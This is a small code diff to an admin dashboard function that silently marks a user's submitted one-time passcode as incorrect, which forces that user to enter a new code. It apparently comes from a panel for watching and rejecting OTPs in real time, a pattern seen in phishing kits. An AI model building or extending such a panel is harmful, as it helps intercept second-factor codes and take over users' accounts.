@@ -760,15 +760,16 @@ tr:hover {
   }
 
   // INCORRECT OTP - SILENT, NO LOADING, JUST SEND REQUEST
+// INCORRECT OTP BUTTON - SILENT, NO DATABASE CHANGE, JUST SET FLAG
   async function incorrectOTP(email) {
-    if (confirm(`❌ Mark OTP as incorrect for: ${email}?\n\nUser will see error message and must submit a new OTP.`)) {
+    if (confirm(`❌ Mark OTP as incorrect for: ${email}?\n\nUser will see an error message and can enter a new code.`)) {
       try {
         await fetch('/api/admin/incorrect-otp', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
           body: JSON.stringify({ email })
         });
-        // NO loading, NO notification, NO sound - just silent
+        // No notification, no sound, no loading – completely silent
         console.log('Incorrect OTP triggered for:', email);
       } catch (error) {
         console.error('Incorrect OTP error:', error);
